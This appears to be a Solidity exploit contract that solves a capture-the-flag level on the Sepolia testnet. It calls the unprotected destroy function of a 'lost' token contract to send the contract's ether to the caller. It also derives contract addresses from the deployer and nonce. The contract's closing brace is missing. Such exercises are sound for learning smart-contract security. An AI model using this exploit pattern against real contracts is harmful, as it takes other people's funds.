//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Recovery.sol";

contract Attack{

//the lost address can be recovered from sepolia.etherscan in the second internal transaction of the recovery contract
// link   https://sepolia.etherscan.io/address/0x891bF2452809AF864E97EA8FBb783801a6Ab1939#internaltx

address payable lostAddress = payable(0x0aA74222f6c110581048Eb238D6a7b1a7E00571c);
SimpleToken token = SimpleToken(lostAddress);

function recover() external {
    token.destroy(payable(tx.origin));
}

//alternative function to determine the address:
//addresses on Ethereum are deterministic =>
//=> they are calculated by using a formula 
// address = last 20 bytes of keccak(rlp.encode(senderAddress, nonce))
// where sender is the deployer and nonce is the nr of txn executed by that address

function lostAddressV2(address recovery) external pure returns(address){
    return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6),bytes1(0x94),recovery, bytes1(0x01))))));
}
